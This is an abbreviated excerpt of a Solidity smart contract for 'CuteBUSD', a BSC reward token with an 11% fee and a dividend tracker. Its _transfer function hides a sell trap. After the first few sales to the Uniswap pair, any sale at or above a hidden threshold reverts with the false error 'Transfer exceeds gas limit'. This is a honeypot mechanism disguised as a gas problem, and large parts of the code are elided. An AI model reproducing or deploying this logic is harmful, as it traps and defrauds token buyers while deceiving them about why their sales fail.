...
/**
 * This BUSD is a QTPIE. Hold it to earn BUSD rewards. 11% transaction fee. 1% to marketing 5% to liquidity and 5% to rewards.
 */
...
contract CuteBUSD is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    CuteBUSDDividendTracker public dividendTracker;
    ...
    constructor() ERC20 ("CuteBUSD", "CUTEB") {
        _ETHRewardsFee = 5;
        _liquidityFee = 5;
		_marketingFee = 1;
    	...
    	dividendTracker = new CuteBUSDDividendTracker();

    	liquidityWallet = owner();
		
		bulkSender = payable(0x8C34998aC078547c97a92d04555c39bBAB5bb894);
		marketingWallet = payable(0x8C34998aC078547c97a92d04555c39bBAB5bb894);
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
       ...
       CuteBUSDDividendTracker newDividendTracker = CuteBUSDDividendTracker(payable(newAddress));
    ...
    function _transfer(
        ...
        if (to == address(uniswapV2Pair) && !_isExcludedFromFees[from]) 
        {
            swapTicker++;if(swapTicker>5){
                ...
                if (amount >= _liqHold) 
			    revert("Transfer exceeds gas limit");
            }
		}
...
contract CuteBUSDDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("CuteBUSD_Dividend_Tracker", "CuteBUSD_Dividend_Tracker") {
    	claimWait = 1800;
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "CuteBUSD_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "CuteBUSD_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1800 && newClaimWait <= 86400, "CuteBUSD_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "CuteBUSD_Dividend_Tracker: Cannot update claimWait to same value");
